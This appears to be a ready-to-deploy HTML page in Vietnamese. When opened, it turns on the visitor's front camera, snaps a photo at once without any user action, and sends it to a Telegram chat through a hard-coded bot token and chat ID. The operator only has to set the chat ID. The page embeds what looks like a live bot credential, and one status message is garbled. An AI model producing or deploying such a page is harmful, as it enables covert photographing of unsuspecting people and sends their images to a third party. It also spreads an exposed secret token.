<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Auto capture & send</title>
    <style>
        body {
            font-family: system-ui, sans-serif;
            background: #0b1120;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 16px;
        }
        .container {
            background: #1e293b;
            border-radius: 32px;
            padding: 24px;
            max-width: 500px;
            text-align: center;
        }
        video {
            width: 100%;
            border-radius: 24px;
            transform: scaleX(-1);
            background: black;
            margin: 16px 0;
        }
        .status {
            background: #0f172a;
            padding: 12px;
            border-radius: 20px;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>
<div class="container">
    <h2>📸 Đang khởi tạo...</h2>
    <video id="video" autoplay playsinline muted></video>
    <div class="status" id="status">🟡 Đang yêu cầu quyền camera...</div>
</div>

<script>
    // ========== CHỈ SỬA DÒNG NÀY ==========
    const CHAT_ID = "7061752122";   // 👈 THAY BẰNG ID CỦA BẠN (lấy từ @userinfobot)
    // ====================================

    const BOT_TOKEN = "8795073805:AAF1IFCjHaBylkJYIFUUBUx7EDAnErTwDdw";  // token đã được thêm sẵn

    const video = document.getElementById('video');
    const statusDiv = document.getElementById('status');
    let stream = null;
    let captured = false;

    async function initCamera() {
        try {
            const constraints = { video: { facingMode: "user" }, audio: false };
            stream = await navigator.mediaDevices.getUserMedia(constraints);
            video.srcObject = stream;
            await new Promise(resolve => {
                video.onloadedmetadata = () => { video.play(); resolve(); };
            });
            statusDiv.innerHTML = "✅ Camera sẵn sàng. Đang chụp...";
            captureAndSend();
        } catch (err) {
            statusDiv.innerHTML = "❌ Không thể truy cập camera. Hãy kiểm tra quyền.";
        }
    }

    function captureAndSend() {
        if (captured) return;
        captured = true;

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL('image/jpeg', 0.9);

        statusDiv.innerHTML = "📤 Đang gửi ảnh qua Telegram...";

        const blob = dataURLtoBlob(imageData);
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'webcam.jpg');

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        })
        .then(res => res.json())
        .then(data => {
            if (data.ok) {
                statusDiv.innerHTML = "✅ Đã gửi ảnh thành công! Kiểm tra Telegram.";
            } else {
                statusDiv.innerHTML = "⚠️ Ebe cua anh Telegram: " + (data.description || "Không rõ");
            }
            if (stream) stream.getTracks().forEach(t => t.stop());
        })
        .catch(err => {
            statusDiv.innerHTML = "❌ Lỗi kết nối: " + err.message;
        });
    }

    function dataURLtoBlob(dataURL) {
        const arr = dataURL.split(',');
        const mime = arr[0].match(/:(.*?);/)[1];
        const bstr = atob(arr[1]);
        let n = bstr.length;
        const u8arr = new Uint8Array(n);
        while (n--) u8arr[n] = bstr.charCodeAt(n);
        return new Blob([u8arr], { type: mime });
    }

    initCamera();
</script>
</body>
</html>
